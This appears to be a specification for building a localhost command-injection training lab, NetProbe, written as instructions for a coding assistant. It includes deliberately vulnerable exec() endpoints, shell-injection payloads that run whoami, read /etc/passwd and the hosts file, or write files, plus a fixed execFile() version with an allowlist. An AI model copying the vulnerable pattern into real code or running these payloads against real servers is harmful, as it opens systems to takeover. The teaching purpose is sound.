# Command Injection Demo — NetProbe (Ports 3037–3039)

## Global UI Standard — applies to every server in this lab

| Server type | Theme |
|-------------|-------|
| Attacker server / Attack guide | Copy the `<style>` block from `reverse-tabnabbing/public/guide.html` verbatim — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. The HTML lives in `public/guide.html`, served via `res.sendFile`. |
| Internal / target server | Muted corporate — `#1a1a2e` bg, `#e2e8f0` text |
| Victim servers | Realistic product UI matching their brand |

Attacker/guide pages — non-negotiable rules:
- Copy the `<style>` block from `reverse-tabnabbing/public/guide.html` verbatim. Never recreate or paraphrase it.
- Body layout: `padding: 2rem` on body. No `max-width` wrapper div. No centering.
- Panels: use `.flow-box` and `.credentials-panel` classes. These must be full-width — never add `max-width` to them, not in CSS and not as inline `style` attributes. Only `<p>` text elements may use `max-width` for line-length readability.
- Navigation: fixed bottom-left `target-switcher` ONLY. No other open/link buttons.

---

## Context

**Attack:** Command Injection  
**App name:** NetProbe — a developer network diagnostic utility  
**Tagline:** "Instant network diagnostics for developers"  
**Folder:** `demo-attacked/command-injection/`

NetProbe lets authenticated developers run network diagnostics from the browser: ping a host, resolve a domain, or check HTTP response headers. The vulnerable path: the server passes user-supplied hostnames directly into shell commands via `child_process.exec()`. An attacker can append shell operators (`;`, `&&`, `|`, `$()`) to break out of the intended command and execute arbitrary OS commands on the server.

**Why it matters:** Command injection is among the most critical web vulnerabilities — it gives the attacker a shell on the server. A ping utility, a file converter, a thumbnail generator, any feature that shells out with user data is a candidate. This demo shows the exact line that opens the door and the exact change that closes it.

---

## Port Layout

| Port | Role | App |
|------|------|-----|
| 3037 | Vulnerable victim | NetProbe (exec with user input) |
| 3038 | Attack guide | Command Injection Lab (hacker terminal) |
| 3039 | Protected victim | NetProbe (execFile with allowlist) |

---

## Code Comment Standard — educational depth, not one-liners

Comments on vulnerable and protected lines are teaching material, not labels.
Add `// ⚠️ VULNERABLE —` above `exec()` calls and `// ✅ PROTECTED —` above
`execFile()` calls in the two victim servers (never in `attack-guide-server.js`).
**Required nuance for command injection:** explain WHY `exec()` is dangerous —
it spawns a shell, and `;`, `&&`, `|`, `$()` are shell metacharacters the shell
itself interprets, letting an attacker chain arbitrary additional commands onto
the intended one. Contrast directly with `execFile()`: it calls the OS directly
with an argument array, never invoking a shell — so `;`, `&`, `|` are just
characters inside one argument, not control operators. Also note that
blocklisting metacharacters on top of `exec()` is not a real fix — only
`execFile()` removes the shell entirely.

---

## Port 3037 — Vulnerable NetProbe

### File: `command-injection/victim-server.js`

**Dependencies:** `express ^4.18.2`, `cors ^2.8.5`

Enable CORS on port 3037 so the attack guide can make cross-origin fetch calls with auth headers:
```js
const cors = require('cors');
app.use(cors({ origin: 'http://localhost:3038' }));
```

**App concept:** NetProbe — a developer diagnostics dashboard. Three tools available after login:
- **Ping** — sends 4 ICMP packets to a hostname
- **DNS Lookup** — resolves a hostname to IP addresses
- **HTTP Check** — fetches response headers for a URL

**Users (hardcoded for demo simplicity):**
- `alice / alice123` — developer
- `bob / bob123` — developer  
- `admin / admin456` — admin

**Auth mechanism — use this exact pattern in all three servers (3037, 3038 does not need it, 3039):**

```js
const crypto = require('crypto');
const sessions = new Map(); // token → { username, role }

// POST /api/login — issue token
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = USERS.find(u => u.username === username && u.password === password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });
  const token = crypto.randomBytes(32).toString('hex');
  sessions.set(token, { username: user.username, role: user.role });
  res.json({ token, user: { username: user.username, role: user.role } });
});

// Auth middleware
function requireAuth(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  const session = sessions.get(token);
  if (!session) return res.status(401).json({ error: 'Not authenticated' });
  req.user = session;
  next();
}
```

Login page JS stores the token in `localStorage.setItem('authToken', data.token)`. All subsequent API calls send `Authorization: Bearer <token>`. Dashboard JS reads `localStorage.getItem('authToken')` on load and calls `GET /api/me` to restore the logged-in state.

### Vulnerable endpoints

**`POST /api/ping`** — the critical vulnerable endpoint:

```js
// VULNERABLE: user input concatenated directly into shell command
app.post('/api/ping', requireAuth, (req, res) => {
  const { hostname } = req.body;
  const command = `ping -n 4 ${hostname}`; // Windows: -n, Linux/Mac: -c
  exec(command, (error, stdout, stderr) => {
    res.json({ output: stdout || stderr, error: error?.message });
  });
});
```

**`POST /api/dns`** — also vulnerable:

```js
app.post('/api/dns', requireAuth, (req, res) => {
  const { hostname } = req.body;
  exec(`nslookup ${hostname}`, (error, stdout, stderr) => {
    res.json({ output: stdout || stderr });
  });
});
```

**`POST /api/http-check`** — also vulnerable:

```js
app.post('/api/http-check', requireAuth, (req, res) => {
  const { url } = req.body;
  exec(`curl -I --max-time 5 ${url}`, (error, stdout, stderr) => {
    res.json({ output: stdout || stderr });
  });
});
```

Import: `const { exec } = require('child_process');`

### UI design — realistic SaaS tool

Style: Clean developer-tool aesthetic. Dark sidebar, light content area.

Colors: `#1e1e2e` sidebar, `#f8f9fa` content area, `#6366f1` accent (indigo).

Layout:
- Top bar: "NetProbe" logo + logged-in user badge (top-right)
- Left sidebar: navigation links — Ping, DNS Lookup, HTTP Check
- Main content: active tool card with input field + "Run" button + output area

Each tool shows:
- Label: e.g. "Target Hostname"
- Text input (full width)
- "Run Diagnostic" button (indigo)
- Output panel below: monospace font, dark background (`#0d0d0d`), white text — displays raw command output

Login page: white card, centered, minimal. "NetProbe" heading, username + password fields, "Sign In" button.

**Critical — login page input CSS:** Both the username and password fields must use the same CSS class (e.g. `class="login-input"`) and the same explicit styles. Never rely on browser defaults for `input[type="password"]` — it renders differently from `input[type="text"]` without explicit styling. Use:

```css
.login-input {
  width: 100%;
  padding: 0.6rem 0.75rem;
  border: 1px solid #cbd5e1;
  border-radius: 6px;
  font-size: 0.95rem;
  color: #0f172a;
  background: #fff;
  outline: none;
  box-sizing: border-box;
  font-family: inherit;
}
.login-input:focus {
  border-color: #6366f1;
  box-shadow: 0 0 0 3px rgba(99,102,241,0.15);
}
```

Apply `class="login-input"` to BOTH the username `<input type="text">` and the password `<input type="password">`.

**Logout:** Add `POST /api/logout` that removes the token from the sessions Map. Add a "Sign Out" button in the sidebar below the user badge:

```js
// Server-side sessions: real logout is instant — just delete the token
app.post('/api/logout', requireAuth, (req, res) => {
  const token = req.headers.authorization.slice(7);
  sessions.delete(token);
  res.json({ message: 'Logged out' });
});
```

Sidebar logout button HTML:
```html
<button id="btn-logout" style="
  margin-top:1rem;width:100%;padding:0.5rem;
  background:transparent;border:1px solid #475569;
  color:#94a3b8;border-radius:4px;cursor:pointer;font-size:0.8rem;
">Sign Out</button>
```

Logout JS:
```js
document.getElementById('btn-logout').addEventListener('click', async function() {
  var token = localStorage.getItem('authToken');
  if (token) {
    try { await fetch('/api/logout', { method:'POST', headers:{'Authorization':'Bearer '+token} }); }
    catch(e) {}
  }
  localStorage.removeItem('authToken');
  window.location.href = '/login';
});
```

Note in the UI (small text below the Sign Out button, visible only to the developer reading the source):
```
// Unlike JWT, server-side session logout is complete and instant.
// sessions.delete(token) removes the token — no denylist needed.
// Compare: jwt-attacks demo requires an in-memory Set just to approximate this.
```

**`package.json` scripts:**
```json
{
  "scripts": {
    "start":      "node victim-server.js",
    "vulnerable": "node victim-server.js"
  },
  "dependencies": {
    "express": "^4.18.2"
  }
}
```

---

## Port 3038 — Attack Guide (hacker terminal)

### File: `command-injection/attack-guide-server.js`

Open `reverse-tabnabbing/public/guide.html`. Copy its entire `<style>` block **verbatim** — every rule, every value, character for character. Do not rewrite, summarize, or recreate it. Paste it as-is into `public/guide.html` for this demo.

Then build the page content inside `.flow-box` and `.credentials-panel` elements using the style classes already defined in that copied CSS.

### Page structure

**Title:** `⚡ Command Injection Attack Lab — NetProbe (Port 3037)`

**Section 1 — Credentials** (`.credentials-panel` table):

| Field | Value |
|-------|-------|
| Target URL | http://localhost:3037 |
| Username | alice |
| Password | alice123 |

Step: Login at localhost:3037 first to get a valid session.

**Section 2 — Attack Payloads** (`.flow-box`)

Heading: `💀 Attack Payloads`

Subheading: `Paste these into the Hostname field of the Ping tool at localhost:3037.`

Show 6 payloads as a table, each with a copy button. Use `navigator.clipboard.writeText()` for copy buttons.

| Payload | What it does |
|---------|-------------|
| `localhost` | Baseline — normal ping (benign) |
| `localhost & whoami` | Appends `whoami` — reveals server OS user |
| `localhost & dir` | Lists current directory (Windows) |
| `localhost & type C:\Windows\System32\drivers\etc\hosts` | Reads hosts file |
| `localhost & ipconfig` | Reveals network interfaces |
| `localhost & echo PWNED > C:\Temp\pwned.txt` | Writes arbitrary file |

**Note:** If running on Linux/Mac use `ls` instead of `dir`, `cat /etc/hosts` instead of `type`, `ifconfig`/`ip a` instead of `ipconfig`.

Add a note explaining the shell operators:
```
; or & — command separator: runs next command regardless of first result
&& — runs next command only if first succeeds
| — pipes stdout of first command as stdin to second
$(...) — command substitution: output replaces the expression
```

**Section 3 — Why It Works** (`.flow-box`)

Heading: `🔍 Root Cause`

Three code panels, dark background (`background:#111`, `border-left: 3px solid #00ff41`):

**Panel 1 — The vulnerable line:**
```js
const command = `ping -n 4 ${hostname}`;
exec(command, callback);
// If hostname = "localhost & whoami"
// Shell executes: ping -n 4 localhost & whoami
//                 ^^^^^^^^^^^^^^^^^^^^  ^^^^^^
//                   intended command    injected command
```

**Panel 2 — Why exec() is dangerous:**
```
exec(command, callback)
  │
  └─→ Passes command to OS shell (/bin/sh or cmd.exe)
      Shell interprets: ; & && | $() ` etc.
      These are SHELL METACHARACTERS
      They let the attacker chain arbitrary commands
```

**Panel 3 — The fix:**
```js
// SAFE: execFile() takes command + args as separate array
// Shell is never invoked — metacharacters are just text
const { execFile } = require('child_process');
execFile('ping', ['-n', '4', hostname], callback);

// hostname = "localhost & whoami"
// ping receives: ["-n", "4", "localhost & whoami"]
// The & is just a string argument — ping tries to resolve it
```

**Section 4 — Live Test** (`.flow-box`)

Heading: `🧪 Live Test`

Two buttons side by side:
- `Test localhost (safe)` — POST to http://localhost:3037/api/ping with `{"hostname": "localhost"}` (requires user to be logged in — show note)
- `Test Injection` — POST with `{"hostname": "localhost & whoami"}`

Note: "You must be logged in at localhost:3037 for these tests to work. They send to the VULNERABLE server."

Output area below buttons: monospace, dark background, shows raw JSON response.

**Token handling:** The attack guide reads the token from a text input. Add a token field at the top of Section 4:

```html
<div style="margin-bottom:0.75rem;display:flex;gap:0.5rem;align-items:center">
  <label style="font-size:0.82rem;color:#94a3b8;white-space:nowrap">Session token from :3037 login:</label>
  <input class="field" id="session-token" style="flex:1" placeholder="Paste token here (copy from :3037 DevTools → Application → localStorage → authToken)">
</div>
```

Live test buttons send requests with the token from that input:

```js
async function runLiveTest(hostname, port) {
  var token = document.getElementById('session-token').value.trim();
  if (!token) { showResult('Set a session token above first'); return; }
  try {
    var res = await fetch('http://localhost:' + port + '/api/ping', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
      body: JSON.stringify({ hostname: hostname })
    });
    var data = await res.json();
    document.getElementById('live-output').textContent = JSON.stringify(data, null, 2);
  } catch (e) {
    document.getElementById('live-output').textContent = 'Error: ' + e.message;
  }
}

document.getElementById('btn-test-safe').addEventListener('click', function() { runLiveTest('localhost', 3037); });
document.getElementById('btn-test-inject').addEventListener('click', function() { runLiveTest('localhost & whoami', 3037); });
```

Output area (`<pre id="live-output">`) below the buttons.

**Navigation:** Fixed bottom-left `target-switcher` div with two buttons only:
- `Vulnerable (3037)` → `window.open('http://localhost:3037')`
- `Protected (3039)` → `window.open('http://localhost:3039')`

No other navigation buttons anywhere on the page.

**`package.json` scripts:**
```json
{
  "scripts": {
    "guide": "node attack-guide-server.js"
  },
  "dependencies": {
    "express": "^4.18.2"
  }
}
```

---

## Port 3039 — Protected NetProbe

### File: `command-injection/victim-protected-server.js`

Same CORS setup as port 3037 (origin: `http://localhost:3038`). Same auth mechanism (same `sessions` Map + `requireAuth` middleware + `POST /api/login`). Same `POST /api/logout`. Same `.login-input` CSS class on both login form inputs. Same "Sign Out" sidebar button and logout JS. Use `cors ^2.8.5`.

Identical UI to port 3037. Same login page, same three tools, same layout. The only changes are in the API handlers.

### Fix 1 — Use `execFile()` instead of `exec()`

`execFile()` does not invoke a shell. Arguments are passed directly to the OS as an array — shell metacharacters are never interpreted.

```js
const { execFile } = require('child_process');

app.post('/api/ping', requireAuth, (req, res) => {
  const { hostname } = req.body;

  // Validate first
  if (!isValidHostname(hostname)) {
    return res.status(400).json({ error: 'Invalid hostname' });
  }

  // execFile: NO shell — array of args, not a string
  execFile('ping', ['-n', '4', hostname], { timeout: 10000 }, (error, stdout, stderr) => {
    res.json({ output: stdout || stderr, error: error?.message });
  });
});
```

### Fix 2 — Input validation allowlist

```js
function isValidHostname(input) {
  if (!input || typeof input !== 'string') return false;
  if (input.length > 253) return false;
  // Hostname characters only: letters, digits, hyphens, dots
  // No shell metacharacters: ; & | $ ` ( ) < > { } ! * ? [ ] \
  const hostnamePattern = /^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$/;
  return hostnamePattern.test(input);
}
```

For the URL endpoint (`/api/http-check`), validate with:
```js
function isValidUrl(input) {
  try {
    const url = new URL(input);
    return url.protocol === 'https:' || url.protocol === 'http:';
  } catch {
    return false;
  }
}
```

And use `execFile('curl', ['-I', '--max-time', '5', url], ...)` — never string concatenation.

### Protected UI additions

Show a "Security" badge in the top bar: green shield icon + "Command Injection Protected".

Below each input field, add a note in muted text: "Input validated — hostname characters only. Requests run via execFile(), not exec()."

When the user submits an attack payload (e.g. `localhost & whoami`), the server returns 400 with:
```json
{ "error": "Invalid hostname: only alphanumeric characters, hyphens, and dots are allowed" }
```

Display this error in red below the Run button.

**`package.json` scripts:**
```json
{
  "scripts": {
    "secure": "node victim-protected-server.js"
  }
}
```

---

## Shared `package.json` at `command-injection/`

```json
{
  "name": "command-injection-demo",
  "version": "1.0.0",
  "scripts": {
    "vulnerable":  "node victim-server.js",
    "guide":       "node attack-guide-server.js",
    "secure":      "node victim-protected-server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "cors": "^2.8.5"
  }
}
```

---

## README at `command-injection/README.md`

### Canonical structure (required — write directly in this order)

Write `README.md` directly in this order, `---` between every top-level section:

```
# Command Injection Demo — NetProbe

## Port Reference
## Attack Flow
## How to Run
## Attack Walkthrough
## Vulnerable Lines
## The Fix
## Why It Works
## Defense Details
## Credentials
```

Rename mapping: "What this demonstrates" → `## Why It Works`. "Vulnerable line"
→ `## Vulnerable Lines`. "Attack" (the worked example) folds into
`## Attack Walkthrough` as numbered steps (login → open the Ping tool → paste
the payload → observe output). "Fix" → `## The Fix`. "Run the demo" → `## How to
Run`. "Key technical notes for Cursor" is prompt-authoring guidance, not README
content — do not include it in the README at all; the relevant facts (OS-specific
ping flags, exec vs execFile vs spawn, timeout requirement) belong in
`## Defense Details` instead. No separate protected-server walkthrough — skip
`## Protected Demo`. Add `## Port Reference` (the Port Layout table above) and
build a `## Credentials` table from the three demo users (alice/alice123,
bob/bob123, admin/admin456).

---

### Attack Flow

```
Attacker input: "localhost && cat /etc/passwd"
        ↓
NetProbe (3037): exec(`ping -n 4 ${hostname}`)
        ↓
OS shell receives: ping -n 4 localhost && cat /etc/passwd
        ↓
Shell interprets && as "run next command if first succeeds"
        ↓
ping runs → succeeds → cat /etc/passwd runs → output returned to attacker
```

### What this demonstrates

`child_process.exec()` concatenates a user-supplied string into a shell command. The OS shell interprets `&`, `;`, `|`, and `$()` as control characters — the attacker uses these to append arbitrary commands.

### Vulnerable line

`command-injection/victim-server.js`:
```js
const command = `ping -n 4 ${hostname}`;   // ← hostname is unsanitized user input
exec(command, callback);                    // ← exec() invokes a shell
```

### Attack

Input `localhost & whoami` into the Ping tool. The shell receives:
```
ping -n 4 localhost & whoami
```
It runs both commands. The response includes the output of `whoami` — the OS user the Node.js process is running as. In production, that user often has read access to config files, environment variables, and database credentials.

### Fix

Two layers, both required:
1. **`execFile()` over `exec()`** — no shell is invoked; `&` is just a text character
2. **Input allowlist** — reject anything that isn't a valid hostname before it reaches the OS

### Run the demo

```bash
cd command-injection
npm install
npm run vulnerable           # terminal 1 → localhost:3037
npm run guide         # terminal 2 → localhost:3038
npm run secure # terminal 3 → localhost:3039
```

---

## Key technical notes for Cursor

1. **OS compatibility:** `ping` flags differ by OS. Use `-n 4` on Windows, `-c 4` on Linux/Mac. Detect via `process.platform === 'win32'`.

2. **`exec()` vs `execFile()` vs `spawn()`:**
   - `exec(string)` → shell (`/bin/sh -c string` or `cmd.exe /c string`) → interprets metacharacters
   - `execFile(file, args[])` → direct OS call → metacharacters are just strings
   - `spawn(file, args[])` → same as execFile for this purpose; use for streaming

3. **Timeout on all child processes:** Add `{ timeout: 10000 }` to prevent an attacker from running a long-running command that holds a connection open indefinitely.

4. **Do not sanitize and still use exec():** Blocklists for shell metacharacters are insufficient — they miss encoding tricks and edge cases. The fix is `execFile()`, not a blocklist on `exec()`.

5. **The attack requires auth:** The user must log in first. This is intentional — command injection in the real world is usually an authenticated vulnerability behind a legitimate feature. The demo simulates a developer tool, not a public endpoint.
